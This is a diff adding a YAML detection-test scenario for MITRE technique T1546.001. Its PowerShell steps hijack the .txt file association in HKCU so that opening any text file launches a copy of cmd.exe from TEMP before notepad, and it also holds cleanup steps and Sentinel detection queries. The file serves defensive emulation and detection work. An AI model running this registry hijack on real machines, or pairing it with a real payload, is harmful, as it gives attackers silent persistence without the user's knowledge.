@@ -1,0 +1,90 @@
+id: T1546.001_event_triggered_execution_change_default_file_association
+name: "Event Triggered Execution — Change Default File Association"
+mitre_technique: "T1546.001"
+mitre_tactic: "persistence"
+description: >
+  Adversaries modify the default file handler for a common file extension so that
+  opening any file of that type triggers their malicious payload alongside (or instead
+  of) the legitimate application. For example, changing the .txt handler to run
+  cmd.exe /c malware.exe && notepad.exe %1 means every .txt file open runs the malware.
+  File associations are stored in HKCU\Software\Classes (user, no elevation) or
+  HKCR (system-wide, needs admin). HKCU overrides HKCR — so no elevation is needed
+  for user-context persistence.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1546/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1546.001 — File Association hijack persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Read current .txt file association — establish baseline"
+    command: |
+      Write-Host "[PAS] Current .txt file association:"
+      $current = cmd.exe /c assoc .txt 2>&1
+      Write-Host "  $current"
+      $handler = cmd.exe /c ftype txtfile 2>&1
+      Write-Host "  Handler: $handler"
+
+  - step: 3
+    type: exec_powershell
+    description: "Hijack .txt association in HKCU — no elevation required"
+    command: |
+      $payload = "$env:TEMP\PAS_T1546_001_payload.exe"
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $payload -Force
+
+      # HKCU\Software\Classes overrides HKCR without elevation
+      $extKey     = "HKCU:\Software\Classes\.txt"
+      $progIdKey  = "HKCU:\Software\Classes\PAS_txtfile"
+      $cmdKey     = "HKCU:\Software\Classes\PAS_txtfile\shell\open\command"
+
+      New-Item -Path $extKey    -Force | Out-Null
+      New-Item -Path $cmdKey    -Force | Out-Null
+      Set-ItemProperty $extKey    -Name "(Default)" -Value "PAS_txtfile"
+      # Run payload then open with notepad (maintains legitimate behaviour)
+      Set-ItemProperty $cmdKey    -Name "(Default)" `
+          -Value "`"$payload`" /c echo PAS-T1546.001-TRIGGERED & notepad.exe `"%1`""
+
+      Write-Host "[PAS] File association hijacked: .txt -> PAS_txtfile"
+      Write-Host "[PAS] Every .txt open now triggers: $payload"
+      Write-Host "[PAS] HKCU-level — no elevation required"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HKCU\\Software\\Classes file extension key modified, new ProgID with shell\\open\\command"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove hijacked file association and payload"
+    command: |
+      Remove-Item "HKCU:\Software\Classes\.txt" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "HKCU:\Software\Classes\PAS_txtfile" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1546_001_payload.exe" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] File association hijack removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1546.001 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: HKCU\\Software\\Classes\\.* extension key created or modified"
+  - "Registry event: new ProgID key under HKCU\\Software\\Classes with shell\\open\\command"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'HKCU' and RegistryKey contains 'Classes' and RegistryKey contains 'shell\\\\open\\\\command'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryValueData contains 'TEMP' and RegistryKey contains 'Classes'"
+  - "MDE alert: 'File association modified for persistence'"
+  - "CONTROL CHECK: Baseline HKCU\\Software\\Classes file handlers — any new handler pointing to TEMP/AppData is malicious"
+  - "CONTROL CHECK: High-value targets: .hta, .js, .vbs, .bat, .ps1, .doc, .xls — adversaries prefer extensions that are frequently opened"
